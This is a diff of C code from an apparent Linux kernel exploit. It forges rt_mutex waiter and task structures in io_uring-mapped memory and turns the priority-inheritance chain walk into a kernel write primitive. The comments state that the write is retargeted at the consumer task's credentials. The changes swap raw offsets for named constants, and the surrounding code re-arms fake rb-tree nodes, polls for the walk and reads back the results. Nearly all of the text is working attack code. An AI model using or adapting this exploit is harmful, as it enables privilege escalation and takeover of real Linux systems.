@@ -117,10 +117,10 @@ void ghost_apply_next_plan(int completed_walks) {
    * can make syscalls post-walk, unlike the main thread). Override the
    * plan's target if the consumer leaked its own task. */
   if (write_mode_is_cred(pselect_custom_write) && g_consumer_task) {
-    pc = (g_consumer_task + TASK15_CRED_OFF - 8) | 1;
+    pc = (g_consumer_task + TASK_CRED_OFF - 8) | 1;
     char m[96];
     int n = snprintf(m, sizeof(m), "[PLAN] retarget walk 1 -> consumer cred %016lx\n",
-                     (unsigned long)(g_consumer_task + TASK15_CRED_OFF));
+                     (unsigned long)(g_consumer_task + TASK_CRED_OFF));
     write(1, m, n);
   }
   for (int m = 0; m < uring_count && m < URING_MAX; m++) {
@@ -131,32 +131,34 @@ void ghost_apply_next_plan(int completed_walks) {
     for (size_t blk = 0; blk < nblocks; blk++) {
       uint8_t *page = (uint8_t *)uring_maps[m] + blk * MM_SLAB_SIZE;
       /* Re-arm pi_tree_entry for the write primitive */
-      put64(page, W0_OFF + 0x18, pc);            /* pi_tree_entry.pc = new target */
-      put64(page, W0_OFF + 0x20, pl->rb_right);  /* pi_tree_entry.rb_right = value */
-      put64(page, W0_OFF + 0x28, 0);             /* pi_tree_entry.rb_left = NULL */
+      put64(page, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF, pc);
+      put64(page, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 8, pl->rb_right);
+      put64(page, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 16, 0);
       /* Re-arm tree_entry (lock->waiters tree node) */
       put64(page, W0_OFF + 0x00, 0);             /* tree_entry.pc = black root */
       put64(page, W0_OFF + 0x08, 0);             /* tree_entry.rb_right = NULL */
       put64(page, W0_OFF + 0x10, 0);             /* tree_entry.rb_left = NULL */
       /* Re-arm lock->waiters tree roots */
-      put64(page, LOCK_OFF + 0x08, fake_w0);     /* lock->waiters.rb_root = W0.tree_entry */
-      put64(page, LOCK_OFF + 0x10, fake_w0);     /* lock->waiters.rb_leftmost = W0 */
+      put64(page, LOCK_OFF + RT_MUTEX_WAITERS_OFF, fake_w0);
+      put64(page, LOCK_OFF + RT_MUTEX_WAITERS_OFF + 8, fake_w0);
       /* Re-arm lock->owner = fake_task|1. The quiesce between overlay
        * rounds zeroes it; without the owner the next walk's [9] check
        * (`if (!rt_mutex_owner(lock)) return 0`) ends the chain cleanly
        * BEFORE the [10]-[11] owner walk -- the erase never fires (observed:
        * [WALKCHK 0] NOT FOUND, dur=69us, no crash). */
-      put64(page, LOCK_OFF + 0x18, fake_task | 1);
+      put64(page, LOCK_OFF + RT_MUTEX_OWNER_OFF, fake_task | 1);
       /* Re-arm fake_task->pi_waiters: walk 0's enqueue_pi inserted the stack
        * waiter, so pi_waiters now points to kernel stack data. Reset it so
        * walk 1's dequeue_pi erases W0 (our controlled node), not the stack waiter. */
-      put64(page, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, fake_w0 + 0x18);
-      put64(page, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8, fake_w0 + 0x18);
+      put64(page, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
+            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+      put64(page, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8,
+            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
       /* W0.prio must be WORSE than every rung so S always displaces W0
        * as the top waiter, triggering the owner-update (= our write). */
-      put32(page, W0_OFF + 0x44, 139);
+      put32(page, W0_OFF + FAKE_WAITER_PRIO_OFF, 139);
       /* Reset W0.task to fake_task (walk 0 might have changed it) */
-      put64(page, W0_OFF + 0x30, fake_task);
+      put64(page, W0_OFF + FAKE_WAITER_TASK_OFF, fake_task);
     }
   }
 }
@@ -332,7 +334,8 @@ static void *walk_poller(void *arg __attribute__((unused))) {
   if (n > 64) n = 64;
   for (int m = 0; m < n; m++) {
     last_lock[m] = *(volatile uint64_t *)((uint8_t *)uring_maps[m] + LOCK_OFF);
-    last_pc[m] = *(volatile uint64_t *)((uint8_t *)uring_maps[m] + W0_OFF + 0x18);
+    last_pc[m] = *(volatile uint64_t *)((uint8_t *)uring_maps[m] + W0_OFF +
+                                       FAKE_WAITER_PI_TREE_ENTRY_OFF);
   }
   while (!atomic_load(&g_poller_stop)) {
     for (int m = 0; m < n; m++) {
@@ -343,10 +346,11 @@ static void *walk_poller(void *arg __attribute__((unused))) {
                 m, LOCK_OFF, (unsigned long long)last_lock[m], (unsigned long long)l);
         last_lock[m] = l;
       }
-      uint64_t pc = *(volatile uint64_t *)(pg + W0_OFF + 0x18);
+      uint64_t pc = *(volatile uint64_t *)(pg + W0_OFF +
+                                          FAKE_WAITER_PI_TREE_ENTRY_OFF);
       if (pc != last_pc[m]) {
         pr_info("[POLL] ring %d W0.pi_tree.pc +0x%04zx: %016llx -> %016llx\n",
-                m, (size_t)W0_OFF + 0x18,
+                m, (size_t)W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF,
                 (unsigned long long)last_pc[m], (unsigned long long)pc);
         last_pc[m] = pc;
       }
@@ -389,8 +393,9 @@ static void readback_full_diff(void) {
     for (size_t off = 0; off + 8 <= MM_SLAB_SIZE; off += 8) {
       uint64_t want = (off < SKB_SEND_SIZE) ?
           *(uint64_t *)(skb_buf + off) : 0;
-      if (ghost_test == 1 && off == W0_OFF + 0x18)
-        want = page_base + W0_OFF + 0x18; /* the RB_EMPTY patch */
+      if (ghost_test == 1 &&
+          off == W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF)
+        want = page_base + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF;
       uint64_t got = *(uint64_t *)(pg + off);
       if (got != want) {
         if (diffs < 12)
@@ -696,7 +701,8 @@ static void do_seqpacket_fake_lock_route(void) {
       for (int m = 0; m < uring_count; m++) {
         uint8_t *page = (uint8_t *)uring_maps[m];
         /* RB_EMPTY_NODE: rt_mutex_dequeue_pi returns without erasing */
-        put64(page, W0_OFF + 0x18, page_base + W0_OFF + 0x18);
+        put64(page, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF,
+              page_base + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF);
       }
       pr_info("GHOST_TEST=1: W0.pi_tree RB_EMPTY (erase will be skipped)\n");
     }
@@ -708,33 +714,33 @@ static void do_seqpacket_fake_lock_route(void) {
       pr_info("    lock@0x%X: wl=%08x rb_node=%016llx rb_left=%016llx owner=%016llx\n",
               LOCK_OFF,
               *(uint32_t *)(page + LOCK_OFF),
-              (unsigned long long)*(uint64_t *)(page + LOCK_OFF + 0x08),
-              (unsigned long long)*(uint64_t *)(page + LOCK_OFF + 0x10),
-              (unsigned long long)*(uint64_t *)(page + LOCK_OFF + 0x18));
+              (unsigned long long)*(uint64_t *)(page + LOCK_OFF + RT_MUTEX_WAITERS_OFF),
+              (unsigned long long)*(uint64_t *)(page + LOCK_OFF + RT_MUTEX_WAITERS_OFF + 8),
+              (unsigned long long)*(uint64_t *)(page + LOCK_OFF + RT_MUTEX_OWNER_OFF));
       pr_info("    W0@0x%X: tree.pc=%016llx tree.r=%016llx tree.l=%016llx\n",
               W0_OFF,
               (unsigned long long)*(uint64_t *)(page + W0_OFF + 0x00),
               (unsigned long long)*(uint64_t *)(page + W0_OFF + 0x08),
               (unsigned long long)*(uint64_t *)(page + W0_OFF + 0x10));
       pr_info("    W0.pi_tree: pc=%016llx r=%016llx l=%016llx\n",
-              (unsigned long long)*(uint64_t *)(page + W0_OFF + 0x18),
-              (unsigned long long)*(uint64_t *)(page + W0_OFF + 0x20),
-              (unsigned long long)*(uint64_t *)(page + W0_OFF + 0x28));
+              (unsigned long long)*(uint64_t *)(page + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF),
+              (unsigned long long)*(uint64_t *)(page + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 8),
+              (unsigned long long)*(uint64_t *)(page + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 16));
       pr_info("    W0.task/lock/prio: task=%016llx lock=%016llx wake=%08x prio=%08x\n",
-              (unsigned long long)*(uint64_t *)(page + W0_OFF + 0x30),
-              (unsigned long long)*(uint64_t *)(page + W0_OFF + 0x38),
-              *(uint32_t *)(page + W0_OFF + 0x40),
-              *(uint32_t *)(page + W0_OFF + 0x44));
+              (unsigned long long)*(uint64_t *)(page + W0_OFF + FAKE_WAITER_TASK_OFF),
+              (unsigned long long)*(uint64_t *)(page + W0_OFF + FAKE_WAITER_LOCK_OFF),
+              *(uint32_t *)(page + W0_OFF + FAKE_WAITER_WAKE_STATE_OFF),
+              *(uint32_t *)(page + W0_OFF + FAKE_WAITER_PRIO_OFF));
       pr_info("    task.pi: waiters.root=%016llx left=%016llx pi_top=%016llx blocked=%016llx\n",
-              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + 0x8F8),
-              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + 0x900),
-              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + 0x908),
-              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + 0x910));
+              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF),
+              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8),
+              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF),
+              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF));
       pr_info("    task.prio/normal: prio=%08x normal=%08x usage=%08x cpu=%08x\n",
-              *(uint32_t *)(page + FAKE_TASK_OFF + 0x7C),
-              *(uint32_t *)(page + FAKE_TASK_OFF + 0x84),
-              *(uint32_t *)(page + FAKE_TASK_OFF + 0x40),
-              *(uint32_t *)(page + FAKE_TASK_OFF + 0x58));
+              *(uint32_t *)(page + FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF),
+              *(uint32_t *)(page + FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF),
+              *(uint32_t *)(page + FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF),
+              *(uint32_t *)(page + FAKE_TASK_OFF + FAKE_TASK_CPU_OFF));
       pr_info("    selftest area: [0x%X]=%016llx [0x%X]=%016llx [0x%X]=%016llx\n",
               SELFTEST_OFF - 8,
               (unsigned long long)*(uint64_t *)(page + SELFTEST_OFF - 8),
@@ -828,7 +834,8 @@ static void do_seqpacket_fake_lock_route(void) {
       for (int bi = 0; ; bi++) {
         uint8_t *pg = uring_block(bi);
         if (!pg) break;
-        uint64_t leftmost = *(uint64_t *)(pg + LOCK_OFF + 0x10);
+        uint64_t leftmost = *(uint64_t *)(pg + LOCK_OFF +
+                                         RT_MUTEX_WAITERS_OFF + 8);
         if (leftmost != (uint64_t)fake_w0) {
           real_page = pg;
           walk_ran = 1;
@@ -843,7 +850,8 @@ static void do_seqpacket_fake_lock_route(void) {
           pr_info("=== skb readback: %d messages received ===\n", nskb);
         for (int s = 0; s < nskb && !real_page; s++) {
           uint8_t *page = skb_readback_buf(s);
-          uint64_t leftmost = *(uint64_t *)(page + LOCK_OFF + 0x10);
+          uint64_t leftmost = *(uint64_t *)(page + LOCK_OFF +
+                                           RT_MUTEX_WAITERS_OFF + 8);
           if (leftmost != (uint64_t)fake_w0) {
             real_page = page;
             walk_ran = 1;
@@ -897,23 +905,24 @@ static void do_seqpacket_fake_lock_route(void) {
       uint8_t *page = real_page;
       pr_info("  readback (calls=%d success=%d walk_ran=%d)\n", calls, success, walk_ran);
       uint32_t wl = *(uint32_t *)(page + LOCK_OFF);
-      uint64_t waiters_root = *(uint64_t *)(page + LOCK_OFF + 0x08);
-      uint64_t waiters_left = *(uint64_t *)(page + LOCK_OFF + 0x10);
-      uint64_t owner = *(uint64_t *)(page + LOCK_OFF + 0x18);
+      uint64_t waiters_root = *(uint64_t *)(page + LOCK_OFF + RT_MUTEX_WAITERS_OFF);
+      uint64_t waiters_left = *(uint64_t *)(page + LOCK_OFF + RT_MUTEX_WAITERS_OFF + 8);
+      uint64_t owner = *(uint64_t *)(page + LOCK_OFF + RT_MUTEX_OWNER_OFF);
       pr_info("  lock: wait_lock=%08x waiters.root=%016llx left=%016llx owner=%016llx\n",
               wl, (unsigned long long)waiters_root, (unsigned long long)waiters_left,
               (unsigned long long)owner);
-      uint64_t pi_root = *(uint64_t *)(page + FAKE_TASK_OFF + 0x8F8);
-      uint64_t pi_left = *(uint64_t *)(page + FAKE_TASK_OFF + 0x900);
-      uint64_t pi_blocked = *(uint64_t *)(page + FAKE_TASK_OFF + 0x910);
+      uint64_t pi_root = *(uint64_t *)(page + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF);
+      uint64_t pi_left = *(uint64_t *)(page + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8);
+      uint64_t pi_blocked = *(uint64_t *)(page + FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF);
       pr_info("  task: pi_waiters.root=%016llx left=%016llx pi_blocked=%016llx\n",
               (unsigned long long)pi_root, (unsigned long long)pi_left,
               (unsigned long long)pi_blocked);
-      uint64_t w0_pc = *(uint64_t *)(page + W0_OFF + 0x18);
-      uint64_t w0_right = *(uint64_t *)(page + W0_OFF + 0x20);
-      uint64_t w0_left = *(uint64_t *)(page + W0_OFF + 0x28);
+      uint64_t w0_pc = *(uint64_t *)(page + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+      uint64_t w0_right = *(uint64_t *)(page + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 8);
+      uint64_t w0_left = *(uint64_t *)(page + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 16);
       int w0_erased = walk_ran &&
-          w0_pc == (uint64_t)(page_base + W0_OFF + 0x18) &&
+          w0_pc == (uint64_t)(page_base + W0_OFF +
+                              FAKE_WAITER_PI_TREE_ENTRY_OFF) &&
           w0_right != pselect_custom_value;
       /* For GHOST_TEST=1 the pc was pre-set to the RB_CLEAR value, so only
        * the rb_right clobber (rb_erase writes pc into *(child+0)) or the
